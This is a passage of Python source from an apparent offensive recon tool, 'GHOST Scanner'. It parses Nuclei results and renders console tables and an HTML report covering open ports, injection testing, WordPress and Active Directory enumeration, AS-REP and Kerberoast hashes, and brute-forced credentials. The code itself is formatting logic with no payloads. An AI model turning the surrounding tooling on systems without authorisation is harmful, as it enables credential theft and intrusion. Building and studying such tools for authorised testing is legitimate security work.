            except Exception:
                pass

        if os.path.isfile(json_path) and os.path.getsize(json_path) > 0:
            with open(json_path, "rb") as f:
                content = f.read().decode("utf-8", errors="ignore").strip()
            if content.startswith("["):
                try:
                    arr = json.loads(content)
                    if isinstance(arr, list):
                        for data in arr:
                            if isinstance(data, dict) and (data.get('template-id') or data.get('templateID')):
                                findings.append(data)
                except Exception:
                    pass
            if not findings:
                for line in content.splitlines():
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        data = json.loads(line)
                        if isinstance(data, dict) and (data.get('template-id') or data.get('templateID')):
                            findings.append(data)
                    except Exception:
                        continue
    except KeyboardInterrupt:
        if process:
            process.terminate()
        print_warning("Nuclei interrupted by user.")
        return []
    except Exception as e:
        print_error(f"Error running Nuclei: {e}")
        return []
    finally:
        if json_path:
            try:
                os.unlink(json_path)
            except Exception:
                pass

    def _extract(item):
        info = item.get('info') if isinstance(item.get('info'), dict) else {}
        return {
            'template_id': item.get('template-id') or item.get('templateID') or item.get('template') or 'unknown',
            'name': info.get('name') or item.get('name') or '',
            'severity': (info.get('severity') or item.get('severity') or 'unknown').lower(),
            'url': item.get('matched-at') or item.get('host') or item.get('url') or '',
            'type': item.get('type') or info.get('type') or '',
            'tags': info.get('tags') or [],
            'description': (info.get('description') or '').strip(),
            'reference': info.get('reference') or [],
        }

    SEV_ORDER = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4, 'unknown': 5}
    SEV_COLOR = {
        'critical': Fore.MAGENTA, 'high': Fore.RED, 'medium': Fore.YELLOW,
        'low': Fore.CYAN, 'info': Fore.WHITE, 'unknown': Fore.WHITE,
    }

    normalized = []
    seen_dedup = set()
    for it in findings:
        ext = _extract(it)
        key = (ext['template_id'], ext['url'], ext['severity'])
        if key in seen_dedup:
            continue
        seen_dedup.add(key)
        normalized.append(ext)
    normalized.sort(key=lambda x: (SEV_ORDER.get(x['severity'], 99), x['template_id']))

    summary = {}
    for n in normalized:
        summary.setdefault(n['severity'], []).append(n['template_id'])

    print_info(f"Total vulnerabilities detected by Nuclei: {len(normalized)}")
    if normalized:
        sum_rows = []
        for sev in sorted(summary.keys(), key=lambda s: SEV_ORDER.get(s, 99)):
            unique_str = ', '.join(sorted(set(summary[sev])))
            display = unique_str if len(unique_str) <= 100 else unique_str[:97] + '...'
            color = SEV_COLOR.get(sev, Fore.WHITE)
            sum_rows.append([
                f"{color}{sev.upper()}{Style.RESET_ALL}",
                str(len(summary[sev])),
                display,
            ])
        print_table(
            headers=["Severity", "Count", "Unique Templates"],
            rows=sum_rows,
            alignments=['<', '>', '<'],
            title="Vulnerability summary by severity:",
        )

        relevant = [n for n in normalized if n['severity'] in ('critical', 'high', 'medium', 'low')]
        if relevant:
            rel_rows = []
            for n in relevant[:50]:
                color = SEV_COLOR.get(n['severity'], Fore.WHITE)
                rel_rows.append([
                    f"{color}{n['severity'].upper()}{Style.RESET_ALL}",
                    n['template_id'],
                    n['name'] or '-',
                    n['url'] or '-',
                ])
            print_table(
                headers=["Severity", "Template", "Name", "URL"],
                rows=rel_rows,
                alignments=['<', '<', '<', '<'],
                title="Relevant findings:",
            )
            if len(relevant) > 50:
                print(f"  ... y {len(relevant) - 50} more relevant findings (see report)")

        for n in normalized:
            FINDINGS.append(
                f"[NUCLEI:{n['severity'].upper()}] {n['template_id']}"
                + (f" — {n['name']}" if n['name'] else "")
                + (f" @ {n['url']}" if n['url'] else "")
            )
    else:
        print("\nNo vulnerabilities detected by Nuclei.")

    if 'nuclei_findings' not in SCAN_DATA or not isinstance(SCAN_DATA['nuclei_findings'], list):
        SCAN_DATA['nuclei_findings'] = []
    SCAN_DATA['nuclei_findings'].extend(normalized)

    if 'nuclei_summary' not in SCAN_DATA or not isinstance(SCAN_DATA['nuclei_summary'], dict):
        SCAN_DATA['nuclei_summary'] = {}
    for sev, tids in summary.items():
        if sev not in SCAN_DATA['nuclei_summary']:
            SCAN_DATA['nuclei_summary'][sev] = []
        prev = set(SCAN_DATA['nuclei_summary'][sev])
        nuevos = [tid for tid in tids if tid not in prev]
        SCAN_DATA['nuclei_summary'][sev].extend(nuevos)
        SCAN_DATA['nuclei_summary'][sev] = list(sorted(set(SCAN_DATA['nuclei_summary'][sev])))
    return normalized

def print_info(msg):
    print(f"{Fore.LIGHTBLACK_EX}[GHOST]{Style.RESET_ALL} {msg}")

def print_good(msg):
    print(f"{Fore.LIGHTGREEN_EX}[>]{Style.RESET_ALL} {msg}")

def print_warning(msg):
    print(f"{Fore.LIGHTYELLOW_EX}[*]{Style.RESET_ALL} {msg}")

def print_error(msg):
    print(f"{Fore.LIGHTRED_EX}[X]{Style.RESET_ALL} {msg}")

def print_vuln(msg):
    FINDINGS.append(f"[VULN] {msg}")
    print(f"{Fore.MAGENTA}[VULN]{Style.RESET_ALL} {msg}")

def print_phase(title):
    """Print a phase header: [INFO] ======= TITLE ======= with spacing above and below."""
    print()
    print(f"{Fore.LIGHTBLACK_EX}[GHOST]{Style.RESET_ALL} ======= {title} =======")
    print()

_ANSI_RE = re.compile(r'\x1b\[[0-9;]*[A-Za-z]')
_BOX_DRAWING_FALLBACK = str.maketrans({
    chr(0x2500): "-",
    chr(0x2502): "|",
    chr(0x250c): "+",
    chr(0x2510): "+",
    chr(0x2514): "+",
    chr(0x2518): "+",
    chr(0x251c): "+",
    chr(0x2524): "+",
    chr(0x252c): "+",
    chr(0x2534): "+",
    chr(0x253c): "+",
})

def _safe_print_line(text=""):
    try:
        print(text)
    except UnicodeEncodeError:
        encoding = sys.stdout.encoding or "utf-8"
        fallback = str(text).translate(_BOX_DRAWING_FALLBACK)
        fallback = fallback.encode(encoding, errors="replace").decode(encoding, errors="replace")
        sys.stdout.write(fallback + os.linesep)

def _visible_len(s):
    return len(_ANSI_RE.sub('', str(s)))

def _pad_cell(cell, width, align='<'):
    """Pad a cell to the given width, ignoring ANSI codes for calculation."""
    cell_str = str(cell)
    pad = width - _visible_len(cell_str)
    if pad <= 0:
        return cell_str
    if align == '<':
        return cell_str + ' ' * pad
    if align == '>':
        return ' ' * pad + cell_str
    left = pad // 2
    return ' ' * left + cell_str + ' ' * (pad - left)

def print_table(headers, rows, alignments=None, title=None, border_color=None, footer=None):
    """Print a box-drawing table with dynamic widths.

    headers: list[str]
    rows: list[list[str]] (cells may contain ANSI codes)
    alignments: list[str] with '<', '>' or '^' per column (default '<')
    title: optional string above the table
    footer: optional string below the table
    """
    if not headers:
        return
    n_cols = len(headers)
    alignments = alignments or ['<'] * n_cols
    if len(alignments) < n_cols:
        alignments = list(alignments) + ['<'] * (n_cols - len(alignments))
    widths = [len(h) for h in headers]
    for r in rows:
        for i in range(n_cols):
            if i < len(r):
                widths[i] = max(widths[i], _visible_len(r[i]))
    color = border_color if border_color is not None else Fore.LIGHTBLACK_EX
    rc = Style.RESET_ALL
    top = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
    mid = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
    bot = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
    if title:
        _safe_print_line(f"\n{color}{title}{rc}")
    _safe_print_line(f"{color}{top}{rc}")
    header_line = " │ ".join(_pad_cell(h, widths[i], alignments[i]) for i, h in enumerate(headers))
    _safe_print_line(f"{color}|{rc} {color}{header_line}{rc} {color}|{rc}")
    _safe_print_line(f"{color}{mid}{rc}")
    for r in rows:
        cells = [
            _pad_cell(r[i] if i < len(r) else '', widths[i], alignments[i])
            for i in range(n_cols)
        ]
        line = f" {color}|{rc} ".join(cells)
        _safe_print_line(f"{color}|{rc} {line} {color}|{rc}")
    _safe_print_line(f"{color}{bot}{rc}")
    if footer:
        _safe_print_line(footer)

def _safe_filename_from_url(target_url):
    """Generate a stable filename from the target URL."""
    parsed = urlparse(target_url or "")
    host = (parsed.netloc or parsed.path or "target").strip().lower()
    path = parsed.path.strip('/') if parsed.netloc else ""
    raw = f"{host}_{path}" if path else host
    safe = re.sub(r'[^a-zA-Z0-9._-]+', '_', raw).strip('._-')
    return safe or "target"

def _default_report_txt_name(target_url):
    return f"{_safe_filename_from_url(target_url)}.txt"

def _normalize_output_paths(output_file, target_url):
    """Return stable paths for TXT/JSON/HTML/MD. Always overwrites per target."""
    reports_dir = os.path.join(os.getcwd(), "reports")
    host_dir = _safe_filename_from_url(target_url)
    out_dir = os.path.join(reports_dir, host_dir)
    os.makedirs(out_dir, exist_ok=True)
    base_name = _default_report_txt_name(target_url)
    txt_file = os.path.join(out_dir, base_name)
    base, ext = os.path.splitext(txt_file)
    if not ext:
        txt_file = txt_file + ".txt"
        base = txt_file[:-4]
    return txt_file, base + ".json", base + ".html", base + ".md"

def _to_serializable(value):
    """Convert non-serializable objects (cookies, sets, etc.) to simple JSON types."""
    if isinstance(value, (str, int, float, bool)) or value is None:
        return value
    if isinstance(value, dict):
        return {str(k): _to_serializable(v) for k, v in value.items()}
    if isinstance(value, (list, tuple, set)):
        return [_to_serializable(v) for v in value]
    if hasattr(value, 'items'):
        try:
            return {str(k): _to_serializable(v) for k, v in value.items()}
        except Exception:
            pass
    return str(value)

def _html_escape(value):
    return html.escape(str(value), quote=True)

def _build_html_report(report_data):
    """Generate the GHOST Scanner HTML report — original 'Recon Brief' UI.

    Self-contained: no external fonts/icon CDNs, system font stack, inline SVG.
    Layout is a sticky command bar + horizontal tab strip with one section
    visible at a time (distinct from any sidebar/dashboard template).
    """
    scan_data = report_data.get("scan_data", {}) or {}
    findings = report_data.get("findings", []) or []
    general = scan_data.get("general", {}) or {}
    technologies = general.get("technologies", []) or []
    auth = scan_data.get("authentication", {}) or {}
    nmap_data = scan_data.get("nmap", {}) or {}
    nmap_ports = nmap_data.get("ports", []) or []
    nmap_nse = nmap_data.get("nse_results", []) or []
    nuclei_findings = scan_data.get("nuclei_findings", []) or []
    nuclei_summary = scan_data.get("nuclei_summary", {}) or {}
    vhosts = scan_data.get("vhosts", []) or []
    directories = scan_data.get("directory_hits", []) or []
    api_endpoints = scan_data.get("api_endpoints", []) or []
    users = scan_data.get("users", []) or []
    emails = scan_data.get("emails", []) or []
    creds = scan_data.get("bruteforce_credentials", []) or []
    wordpress = scan_data.get("wordpress", {}) or {}
    spider = scan_data.get("spider", {}) or {}
    src_code = scan_data.get("source_code_analysis", {}) or {}
    src_findings = src_code.get("findings", []) or []
    active_directory = scan_data.get("active_directory", {}) or {}
    robots_paths = scan_data.get("robots_paths", []) or []
    http_methods = scan_data.get("http_methods", []) or []
    injection = scan_data.get("injection", {}) or {}

    ad_ldap = active_directory.get("ldap") or {}
    ad_nxc = active_directory.get("nxc") or {}
    ad_imp = active_directory.get("impacket") or {}
    ad_kb = active_directory.get("kerbrute") or {}
    asrep_hashes = (ad_imp.get("asrep_roast") or {}).get("hashes", []) or []
    kerberoast_hashes = (ad_imp.get("kerberoast") or {}).get("hashes", []) or []
    ad_creds = ((ad_nxc.get("bruteforce") or {}).get("credentials", []) or [])

    def esc(v):
        return _html_escape(v if v is not None else "")

    def tag(value, tone="muted"):
        return "<span class='gx-tag t-" + tone + "'>" + esc(value if value not in (None, "") else "-") + "</span>"

    def stag(value):
        t = str(value if value is not None else "-"); tl = t.lower(); tone = "muted"
        if t.startswith("2") or tl in ("open", "ok", "true", "yes"):
            tone = "ok"
        elif t.startswith("3") or "medium" in tl:
            tone = "med"
        elif t.startswith("4") or "low" in tl:
            tone = "low"
        elif t.startswith("5") or any(x in tl for x in ("critical", "high", "vulnerable")):
            tone = "crit"
        return tag(t, tone)

    def tbl(headers, rows, empty="No data.", raw=None):
        raw = set(raw or [])
        head = "".join("<th>" + esc(h) + "</th>" for h in headers)
        if not rows:
            return ("<div class='gx-tw'><table><thead><tr>" + head + "</tr></thead><tbody><tr>"
                    "<td colspan='" + str(len(headers)) + "' class='gx-empty'>" + esc(empty) + "</td></tr></tbody></table></div>")
        body = []
        for r in rows:
            cells = []
            for i, c in enumerate(r):
                cells.append("<td>" + (str(c) if i in raw else esc(c)) + "</td>")
            body.append("<tr>" + "".join(cells) + "</tr>")
        return ("<div class='gx-tw'><table><thead><tr>" + head + "</tr></thead><tbody>"
                + "".join(body) + "</tbody></table></div>")

    def chips(items):
        items = [i for i in items if i not in (None, "")]
        if not items:
            return "<p class='gx-dim'>None.</p>"
        return "<div class='gx-chips'>" + "".join("<span class='gx-chip'>" + esc(i) + "</span>" for i in items) + "</div>"

    def card(title, inner, span=1):
        cls = "gx-card" + (" gx-wide" if span == 2 else "")
        return "<div class='" + cls + "'><div class='gx-ct'>" + esc(title) + "</div>" + inner + "</div>"

    def grid(*cards):
        return "<div class='gx-grid'>" + "".join(cards) + "</div>"

    def tech_text(item):
        if isinstance(item, dict):
            name = str(item.get("name", "")).strip()
            detail = str(item.get("detail", "") or item.get("version", "")).strip()
            return name + ((" " + detail) if detail else "")
        return str(item)

    def nver(p):
        parts = [p.get("product", ""), p.get("version", ""), p.get("extrainfo", "")]
        return " ".join(x for x in parts if x).strip() or "-"

    # ---- severity / risk ----
    known = {"critical", "high", "medium", "low", "info"}
    sev = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for n in nuclei_findings:
        s = (n.get("severity") or "info").lower()
        sev[s if s in known else "info"] += 1
    for f in src_findings:
        s = (f.get("severity") or "low").lower()
        sev[s if s in known else "low"] += 1
    sev_total = sum(sev.values())
    risk_score = sev["critical"] * 10 + sev["high"] * 5 + sev["medium"] * 2 + sev["low"]
    if sev["critical"]:
        risk_label, risk_tone = "CRITICAL", "crit"
    elif sev["high"]:
        risk_label, risk_tone = "HIGH", "crit"
    elif sev["medium"]:
        risk_label, risk_tone = "MEDIUM", "med"
    elif sev["low"] or sev_total:
        risk_label, risk_tone = "LOW", "low"
    else:
        risk_label, risk_tone = "CLEAN", "ok"

    # ---- tabs accumulator ----
    tabs = []  # (id, label, count_or_None, html)

    # OVERVIEW -----------------------------------------------------------
    tiles = [
        ("Findings", len(findings), "crit" if findings else "muted"),
        ("Critical", sev["critical"], "crit" if sev["critical"] else "muted"),
        ("High", sev["high"], "high" if sev["high"] else "muted"),
        ("Medium", sev["medium"], "med" if sev["medium"] else "muted"),
        ("Low", sev["low"], "low" if sev["low"] else "muted"),
        ("Open ports", len(nmap_ports), "ok" if nmap_ports else "muted"),
        ("Nuclei hits", len(nuclei_findings), "crit" if nuclei_findings else "muted"),
        ("API endpoints", len(api_endpoints), "low" if api_endpoints else "muted"),
        ("Directories", len(directories), "low" if directories else "muted"),
        ("VHosts", len(vhosts), "low" if vhosts else "muted"),
        ("Users", len(users), "muted"),
        ("Web creds", len(creds), "crit" if creds else "muted"),
        ("AD users", len(ad_ldap.get("users") or []), "low" if (ad_ldap.get("users")) else "muted"),
        ("AS-REP", len(asrep_hashes), "crit" if asrep_hashes else "muted"),
        ("Kerberoast", len(kerberoast_hashes), "crit" if kerberoast_hashes else "muted"),
        ("Src secrets", len(src_findings), "high" if src_findings else "muted"),
    ]
    tiles = [t for i, t in enumerate(tiles) if i < 5 or t[1]]
    tiles_html = "<div class='gx-tiles'>" + "".join(
        "<div class='gx-tile t-" + tone + "'><span class='gx-tn'>" + esc(label) +
        "</span><span class='gx-tv'>" + esc(val) + "</span></div>"
        for label, val, tone in tiles
    ) + "</div>"

    # stacked severity meter
    meter_segs = ""
    seg_order = [("critical", "crit"), ("high", "high"), ("medium", "med"), ("low", "low"), ("info", "info")]
    if sev_total:
        for key, tone in seg_order:
            if sev[key]:
                meter_segs += ("<span class='seg t-" + tone + "' style='flex:" + str(sev[key]) +
                               "' title='" + key + ": " + str(sev[key]) + "'></span>")
    else:
        meter_segs = "<span class='seg t-ok' style='flex:1'></span>"
    legend = "".join(
        "<span class='gx-leg'><i class='dot t-" + tone + "'></i>" + key.capitalize() +
        " <b>" + str(sev[key]) + "</b></span>" for key, tone in seg_order
    )
    meter_html = ("<div class='gx-meter'>" + meter_segs + "</div><div class='gx-legends'>" + legend + "</div>")

    # top findings preview
    top_rows = []
    for f in findings[:14]:
        m = re.match(r'^\[([^\]]+)\]\s*(.*)', str(f))
        cat, msg = (m.group(1), m.group(2)) if m else ("INFO", str(f))
        cl = cat.upper()
        tone = "crit" if cl.startswith(("VULN", "NUCLEI:CRIT", "NUCLEI:HIGH", "CRED", "WP:VULN", "CODE:CRIT", "CODE:HIGH", "AD:")) \
            else ("med" if cl.startswith(("NUCLEI:MED", "DIR", "VHOST", "WP")) else "low")
        top_rows.append([tag(cat, tone), msg])
    overview = (
        "<div class='gx-risk t-" + risk_tone + "'><div><span class='gx-rk'>RISK</span>"
        "<span class='gx-rv'>" + esc(risk_label) + "</span></div>"
        "<div class='gx-rs'>score <b>" + str(risk_score) + "</b> · " + str(sev_total) + " rated findings</div></div>"
        + tiles_html
        + card("Severity distribution", meter_html, span=2)
        + card("Top findings", tbl(["Class", "Detail"], top_rows, "No findings recorded.", raw={0}), span=2)
    )
    tabs.append(("overview", "Overview", None, overview))

    # GENERAL ------------------------------------------------------------
    if general or technologies or users or emails or robots_paths or http_methods:
        info_rows = [
            ["Target", report_data.get("target", "-")],
            ["HTTP status", general.get("status_code", "-")],
            ["Server", general.get("server", "-")],
            ["Auth", ("Yes — " + str(auth.get("method"))) if auth.get("authenticated") else "Not authenticated"],
            ["Cookies", ", ".join(general.get("cookies") or []) or "-"],
        ]
        tech_rows = [[tech_text(t)] for t in technologies]
        hdr = general.get("headers") or {}
        hdr_rows = [[k, v] for k, v in hdr.items()]
        g = grid(
            card("Recon", tbl(["Field", "Value"], info_rows)),
            card("Technologies", tbl(["Stack"], tech_rows, "Not fingerprinted.")),
        )
        g += grid(
            card("HTTP response headers", tbl(["Header", "Value"], hdr_rows, "Not captured.")),
            card("Discovered identities", "<h4 class='gx-h4'>Users</h4>" + chips(users) +
                 "<h4 class='gx-h4'>Emails</h4>" + chips(emails)),
        )
        if robots_paths or http_methods:
            g += grid(
                card("robots.txt / sitemap", chips(robots_paths)),
                card("Allowed HTTP methods", chips(sorted(set(http_methods)))),
            )
        tabs.append(("general", "General", len(technologies) or None, g))

    # NMAP ---------------------------------------------------------------
    if nmap_ports or nmap_nse:
        port_rows = [[str(p.get("port", "-")) + "/" + str(p.get("protocol", "")), stag(p.get("state", "-")),
                      p.get("service", "-") or "-", nver(p)] for p in nmap_ports]
        nse_rows = [[str(i.get("port", "-")) + "/" + str(i.get("protocol", "")), i.get("service", "-") or "-",
                     i.get("script_id", "-") or "-",
                     ((i.get("output") or "-").splitlines()[0] if i.get("output") else "-")] for i in nmap_nse]
        cmd = nmap_data.get("command")
        head = ("<p class='gx-dim'>command: <code>" + esc(cmd) + "</code></p>") if cmd else ""
        body = head + card("Open ports", tbl(["Port", "State", "Service", "Version"], port_rows, "No ports.", raw={1}), span=2)
        body += card("Targeted NSE", tbl(["Port", "Service", "Script", "Output"], nse_rows, "No NSE output."), span=2)
        tabs.append(("nmap", "Nmap", len(nmap_ports) or None, body))

    # FINDINGS -----------------------------------------------------------
    if findings:
        cats = {}
        for f in findings:
            m = re.match(r'^\[([^\]]+)\]', str(f))
            cats.setdefault(m.group(1) if m else "OTHER", []).append(str(f))
        cat_rows = [[c, str(len(cats[c]))] for c in sorted(cats)]
        det_rows = []
        for f in findings:
            m = re.match(r'^\[([^\]]+)\]\s*(.*)', str(f))
            cat, msg = (m.group(1), m.group(2)) if m else ("OTHER", str(f))
            cl = cat.upper()
            tone = "crit" if cl.startswith(("VULN", "NUCLEI:CRIT", "NUCLEI:HIGH", "CRED", "WP:VULN", "CODE:CRIT", "CODE:HIGH", "AD:")) \
                else ("med" if cl.startswith(("NUCLEI:MED", "DIR", "VHOST", "WP")) else "low")
            det_rows.append([tag(cat, tone), msg])
        body = grid(card("By category", tbl(["Class", "Count"], cat_rows)))
        body += card("All findings", tbl(["Class", "Detail"], det_rows, "No findings.", raw={0}), span=2)
        tabs.append(("findings", "Findings", len(findings), body))

    # NUCLEI -------------------------------------------------------------
    if nuclei_findings or nuclei_summary:
        rank = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4, "unknown": 5}
        sum_rows = []
        for s in sorted(nuclei_summary.keys(), key=lambda x: rank.get(x, 9)):
            sum_rows.append([stag(s.upper()), str(len(nuclei_summary[s])), ", ".join(sorted(set(nuclei_summary[s])))])
        nf = sorted(nuclei_findings, key=lambda x: rank.get((x.get("severity") or "unknown").lower(), 9))
        nf_rows = [[stag((n.get("severity") or "info").upper()), n.get("template_id", "-") or "-",
                    n.get("name", "-") or "-", n.get("url", "-") or "-"] for n in nf]
        body = card("Summary by severity", tbl(["Severity", "Count", "Templates"], sum_rows, "No summary."), span=2)
        body += card("Findings", tbl(["Severity", "Template", "Name", "URL"], nf_rows, "No Nuclei findings.", raw={0}), span=2)
        tabs.append(("nuclei", "Nuclei", len(nuclei_findings) or None, body))

    # API ----------------------------------------------------------------
    if api_endpoints:
        rows = [[stag(e.get("status", "-")), e.get("endpoint") or e.get("url", "-"), e.get("content_type", "-") or "-"]
                for e in api_endpoints]
        tabs.append(("api", "API", len(api_endpoints),
                     card("Discovered endpoints", tbl(["Status", "Endpoint", "Content-Type"], rows, raw={0}), span=2)))

    # WEB (vhosts + directories) ----------------------------------------
    if vhosts or directories:
        vh = [[stag(v.get("status", "-")), v.get("fqdn") or v.get("subdomain", "-"), str(v.get("size", "-"))] for v in vhosts]
        dr = [[stag(h.get("status", "-")), h.get("url", "-"), str(h.get("size", "-"))] for h in directories]
        body = card("Virtual hosts", tbl(["Status", "VHost", "Size"], vh, "No vhosts.", raw={0}), span=2)
        body += card("Directories", tbl(["Status", "URL", "Size"], dr, "No directories.", raw={0}), span=2)
        tabs.append(("web", "Web", (len(vhosts) + len(directories)) or None, body))

    # ATTACK SURFACE / INJECTION ----------------------------------------
    if injection.get("executed"):
        inj_rows = [
            ["Forms detected", str(injection.get("forms_found", 0))],
            ["GET params detected", str(injection.get("url_params_found", 0))],
            ["GET params tested", str(len(injection.get("tested_get_params", [])))],
            ["Form inputs tested", str(len(injection.get("tested_form_inputs", [])))],
        ]
        fi_rows = []
        for fi in injection.get("tested_form_inputs", []):
            if isinstance(fi, dict):
                fi_rows.append([fi.get("url", "-"), fi.get("input", "-"), fi.get("method", "-")])
        body = grid(
            card("Injection coverage", tbl(["Metric", "Value"], inj_rows)),
            card("Tested GET parameters", chips(injection.get("tested_get_params", []))),
        )
        body += card("Tested form inputs", tbl(["URL", "Input", "Method"], fi_rows, "None tested."), span=2)
        tabs.append(("surface", "Injection", None, body))

    # SPIDER -------------------------------------------------------------
    if spider.get("total_urls") or spider.get("sample_urls"):
        s_rows = [["URLs", str(spider.get("total_urls", 0))], ["Parameters", str(spider.get("total_params", 0))],
                  ["Forms", str(spider.get("total_forms", 0))]]
        url_rows = [[u] for u in (spider.get("sample_urls") or [])]
        body = grid(
            card("Crawl stats", tbl(["Metric", "Value"], s_rows)),
            card("Parameters", chips(spider.get("sample_params") or [])),
        )
        body += card("Sample URLs", tbl(["URL"], url_rows, "No URLs."), span=2)
        tabs.append(("spider", "Spider", spider.get("total_urls") or None, body))

    # SOURCE CODE --------------------------------------------------------
    if src_code.get("pages_analyzed") or src_findings:
        summ = src_code.get("summary") or {}
        sc_rows = [["Pages analyzed", str(src_code.get("pages_analyzed", 0))],
                   ["Assets analyzed", str(src_code.get("assets_analyzed", 0))],
                   ["Findings", str(len(src_findings))],
                   ["Critical / High", str(summ.get("critical", 0)) + " / " + str(summ.get("high", 0))],
                   ["Medium / Low", str(summ.get("medium", 0)) + " / " + str(summ.get("low", 0))]]
        rank = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        sf = sorted(src_findings, key=lambda x: rank.get((x.get("severity") or "low").lower(), 9))
        sf_rows = [[stag((f.get("severity") or "low").upper()), f.get("type", "-") or "-",
                    f.get("value", "-") or "-", f.get("url", "-") or "-"] for f in sf]
        body = grid(card("Summary", tbl(["Metric", "Value"], sc_rows)))
        body += card("Exposed secrets", tbl(["Severity", "Type", "Value", "URL"], sf_rows, "No secrets found.", raw={0}), span=2)
        tabs.append(("code", "Source", len(src_findings) or None, body))

    # WORDPRESS ----------------------------------------------------------
    if wordpress:
        ver = wordpress.get("version") or {}
        theme = wordpress.get("main_theme") or {}
        wp_rows = [["Detected", "Yes" if wordpress.get("detected") else "Not confirmed"],
                   ["Version", ver.get("number") or "-"], ["Status", ver.get("status") or "-"],
                   ["Main theme", theme.get("name") or "-"], ["Plugins", str(len(wordpress.get("plugins") or []))],
                   ["Users", str(len(wordpress.get("users") or []))],
                   ["Vulnerabilities", str(len(wordpress.get("vulnerabilities") or []))],
                   ["Credentials", str(len(wordpress.get("credentials") or []))]]
        u_rows = [[u.get("username", "-"), u.get("name", "-")] for u in (wordpress.get("users") or []) if isinstance(u, dict)]
        v_rows = [[v.get("component_type", "-"), v.get("component", "-"), v.get("title", "-"), v.get("fixed_in", "-")]
                  for v in (wordpress.get("vulnerabilities") or []) if isinstance(v, dict)]
        c_rows = [[c.get("username", "-"), c.get("password", "-")] for c in (wordpress.get("credentials") or []) if isinstance(c, dict)]
        body = grid(card("Summary", tbl(["Field", "Value"], wp_rows)), card("Users", tbl(["User", "Name"], u_rows, "No users.")))
        body += card("Vulnerabilities", tbl(["Type", "Component", "Title", "Fixed in"], v_rows, "No vulnerabilities."), span=2)
        if c_rows:
            body += card("Credentials", tbl(["User", "Password"], c_rows), span=2)
        tabs.append(("wordpress", "WordPress", len(wordpress.get("vulnerabilities") or []) or None, body))

    # ACTIVE DIRECTORY ---------------------------------------------------
    if active_directory:
        ad_rows = [["Domain Controller", active_directory.get("target", "-")],
                   ["Domain", active_directory.get("domain", "-")], ["Base DN", active_directory.get("base_dn", "-")],
                   ["Mode", active_directory.get("auth_mode", "-")],
                   ["Kerbrute users", str(len(ad_kb.get("valid_users") or []))],
                   ["LDAP users", str(len(ad_ldap.get("users") or []))],
                   ["LDAP groups", str(len(ad_ldap.get("groups") or []))],
                   ["LDAP computers", str(len(ad_ldap.get("computers") or []))],
                   ["AS-REP roastable", str(len(asrep_hashes))], ["Kerberoastable SPNs", str(len(kerberoast_hashes))],
                   ["NXC credentials", str(len(ad_creds))]]
        lu = [[u.get("username", "-"), u.get("upn", "-"), u.get("cn", "-"), ", ".join(u.get("memberOf") or [])]
              for u in (ad_ldap.get("users") or [])]
        body = grid(card("Summary", tbl(["Field", "Value"], ad_rows)),
                    card("Kerbrute valid users", chips(ad_kb.get("valid_users") or [])))
        body += card("LDAP users", tbl(["User", "UPN", "CN", "Groups"], lu, "No LDAP users."), span=2)
        if asrep_hashes:
            body += card("AS-REP roastable", tbl(["User", "Hash"],
                         [[h.get("username", "-"), h.get("hash", "-")] for h in asrep_hashes]), span=2)
        if kerberoast_hashes:
            body += card("Kerberoastable SPNs", tbl(["User/SPN", "Hash"],
                         [[h.get("username", "-"), h.get("hash", "-")] for h in kerberoast_hashes]), span=2)
        if ad_creds:
            body += card("NXC credentials", tbl(["User", "Password"],
                         [[c.get("username", "-"), c.get("password", "-")] for c in ad_creds]), span=2)
        tabs.append(("ad", "Active Directory", None, body))

    # WEB CREDENTIALS ----------------------------------------------------
    if creds:
        c_rows = [[c.get("username", "-") if isinstance(c, dict) else str(c),
                   c.get("password", "-") if isinstance(c, dict) else "-"] for c in creds]
        tabs.append(("creds", "Credentials", len(creds),
                     card("Recovered web credentials", tbl(["User", "Password"], c_rows), span=2)))

    # RAW ----------------------------------------------------------------
    try:
        raw_json = json.dumps(_to_serializable(scan_data), indent=2, ensure_ascii=False)
    except Exception:
        raw_json = "{}"
    tabs.append(("raw", "Raw JSON", None,
                 card("Full scan data", "<pre class='gx-pre'>" + esc(raw_json) + "</pre>", span=2)))

    # ---- assemble nav + panels ----
    nav = ""
    panels = ""
    for idx, (tid, label, count, html) in enumerate(tabs):
        on = " on" if idx == 0 else ""
        cnt = ("<b class='gx-cnt'>" + str(count) + "</b>") if count else ""
        nav += "<button class='gx-tab" + on + "' data-tab='" + tid + "'>" + esc(label) + cnt + "</button>"
        panels += "<section class='gx-panel" + on + "' id='tab-" + tid + "'>" + html + "</section>"

    auth_str = ("auth: " + esc(auth.get("method") or "session")) if auth.get("authenticated") else "auth: none"

    template = """<!doctype html>
<html lang="en" data-theme="dark">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="generator" content="GHOST Scanner">
<title>GHOST Recon Brief - __TITLE_TARGET__</title>
<style>
:root{
  --bg:#0c0708; --bg2:#120b0c; --card:#1a1012; --card2:#241419; --line:#3a232c;
  --txt:#f1e7e9; --dim:#b29aa0; --accent:#ff3050; --accent2:#ff7a3c;
  --crit:#ff3b5c; --high:#ff8a3c; --med:#ffcf4a; --low:#5b9dff; --info:#9c8a90; --ok:#34d39a; --muted:#6b4a55;
  --mono:ui-monospace,SFMono-Regular,"Cascadia Code","JetBrains Mono",Menlo,Consolas,monospace;
  --sans:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;
}
html[data-theme="light"]{
  --bg:#fbf3f4; --bg2:#f5e8ea; --card:#ffffff; --card2:#fdf2f3; --line:#f0d9dd;
  --txt:#1f1216; --dim:#7a5b63; --accent:#d11f3a; --accent2:#c2401a;
  --crit:#d11f3a; --high:#c2561a; --med:#9a7d0a; --low:#3d63d6; --info:#8a727a; --ok:#0a8f6c; --muted:#b59aa0;
}
*{box-sizing:border-box}
html{scroll-behavior:smooth}
body{margin:0;background:var(--bg);color:var(--txt);font-family:var(--sans);font-size:14px;line-height:1.5;
  background-image:repeating-linear-gradient(0deg,transparent 0 38px,rgba(255,48,80,.03) 38px 39px);}
code,pre,.gx-tv,.gx-rv,td .mono{font-family:var(--mono)}
a{color:var(--accent);text-decoration:none}
